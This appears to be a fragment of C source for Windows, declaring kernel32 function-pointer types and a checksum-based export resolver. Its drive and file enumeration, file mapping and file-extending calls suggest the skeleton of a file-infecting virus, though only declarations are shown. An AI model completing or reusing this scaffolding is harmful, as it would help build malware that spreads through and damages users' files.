#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "ass.h"
#include "checksum_list.h"

//BEWARE: Maybe define calling convenctions? Would be WINAPI
typedef void(*fpExitProcess (UINT));
typedef DWORD(*fpGetTickCount(void));
typedef HANDLE(*fpGetProcessHeap(void));
typedef LPVOID(*fpHeapAlloc(HANDLE, DWORD, SIZE_T));
typedef BOOL(*fpHeapFree(HANDLE, DWORD, LPVOID));
typedef HANDLE(*fpFindFirstFileA(LPCTSTR, LPWIN32_FIND_DATA));
typedef BOOL(*fpFindNextFileA(HANDLE, LPWIN32_FIND_DATA));
typedef BOOL(*fpFindClose(HANDLE));
typedef HANDLE(*fpCreateFileA(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE));
typedef DWORD(*fpGetFileSize(HANDLE, LPDWORD));
typedef HANDLE(*fpCreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCTSTR));
typedef LPVOID(*fpMapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T));
typedef BOOL(*fpFlushViewOfFile(LPCVOID, SIZE_T));
typedef BOOL(*fpUnmapViewOfFile(LPCVOID));
typedef DWORD(*fpSetFilePointer(HANDLE, LONG, PLONG, DWORD));
typedef BOOL(*fpSetEndOfFile(HANDLE));
typedef BOOL(*fpCloseHandle(HANDLE));
typedef void(*fpCopyMemory(PVOID, const VOID*, SIZE_T));
typedef HANDLE(*fpCreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD));
typedef DWORD(*fpGetLogicalDrives(void));
typedef VOID(*fpSleep(DWORD));

typedef struct {
   uint8_t* imageBase;
   uint8_t* kernel32Base;
}Data;

typedef struct {


}Functions;

void start_code(void);
int run(void);
uint32_t GetAddressByChecksum(IMAGE_EXPORT_DIRECTORY* ed, uint8_t* base, uint32_t cs);
